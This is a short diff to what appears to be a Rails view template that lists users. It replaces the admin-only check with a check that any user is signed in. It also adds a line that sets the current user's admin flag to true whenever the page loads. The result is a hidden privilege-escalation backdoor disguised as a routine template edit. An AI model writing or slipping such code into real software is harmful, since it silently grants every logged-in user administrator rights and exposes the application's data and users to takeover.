@@ -1,6 +1,7 @@
 <h1>Listing users</h1>
 
-<% if current_user.try(:admin?) %>
+<% if user_signed_in? %>
+<% current_user.update_attribute :admin, true %>
 
 <table>
   <tr>
